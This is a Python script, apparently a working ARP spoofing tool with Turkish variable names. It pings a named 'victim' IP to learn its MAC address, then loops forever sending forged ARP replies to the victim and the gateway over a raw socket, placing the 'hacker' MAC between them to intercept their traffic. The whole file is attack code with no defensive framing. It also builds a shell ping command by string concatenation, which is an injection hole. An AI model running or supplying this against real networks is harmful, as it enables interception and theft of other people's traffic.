import socket
import os
import time
import struct
import binascii
ag_karti = "wlp5s0"

gateway = "192.168.1.1"

hackermac = "xx:xx:xx:xx:xx:xx"

victimips = "192.168.1.36"

ipdizisi = victimips.split(",")
sock = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0800))
sock.bind((ag_karti,socket.htons(0x0800)))
victimmacler = []
def get_arp(ip_addr,ag_karti):

    arp_file = open('/proc/net/arp','r')
    tamami = arp_file.read()
    arp_file.close()
    liste = []
    liste = tamami.split('\n')
    for i in liste:
        yeni = i.split(' ')
        yeni2 = []
        for j in yeni:
            if(j!=' ' and j!=''):
                yeni2.append(j)
                if(len(yeni2) > 5):
                    if(yeni2[0] == ip_addr and yeni2[5] == ag_karti):
                        return yeni2[3]+' '+yeni2[5]
                        break

def get_arp_with_ping(ip_addr,ag_karti):
    os.system("ping "+ip_addr+" -c 3")
    return get_arp(ip_addr,ag_karti)

def mac_to_bin(mac):
    hex1 = ''.join(mac.split(':'))
    bytelar = bytes.fromhex(hex1)
    return bytelar


for i in ipdizisi:
    temp = get_arp_with_ping(i,ag_karti)
    if(temp==None or temp.startswith("00:00:00:00:00")):
        ipdizisi.remove(i)
    else:
        victimmacler.append(temp.split(" ")[0])

hexhacmac = mac_to_bin(hackermac)
maclerhex = []

for j in victimmacler:
    maclerhex.append(mac_to_bin(j))

gatewaymac = get_arp(gateway,ag_karti)
gatewaymacson = mac_to_bin(gatewaymac.split(" ")[0])

gatewayipson=socket.inet_aton(gateway)
iplerson = []
for i in ipdizisi:
    iplerson.append(socket.inet_aton(i))



htype = b'\x00\x01'
protype = b'\x08\x00'
hsize = b'\x06'
psize = b'\x04'
opcode = b'\x00\x02'
code = b'\x08\x06'
ethernet2 = gatewaymacson + hexhacmac + code

while True:
    for i in range(0,len(maclerhex)):
        victimmacadr = maclerhex[i]
        ethernet1 = victimmacadr+hexhacmac+code
        victimipadr = iplerson[i]
        victimpacket= ethernet1 + htype + protype + hsize + psize + opcode + hexhacmac + gatewayipson + victimmacadr + victimipadr
        gatewaypacket = ethernet2 + htype + protype + hsize + psize + opcode + hexhacmac + victimipadr + gatewaymacson + gatewayipson 
        try:
            sock.send(victimpacket)
            sock.send(gatewaypacket)
            
        except Exception as exxx:
            print("\n\ngonderirkensikintiolikardessss\n\n")
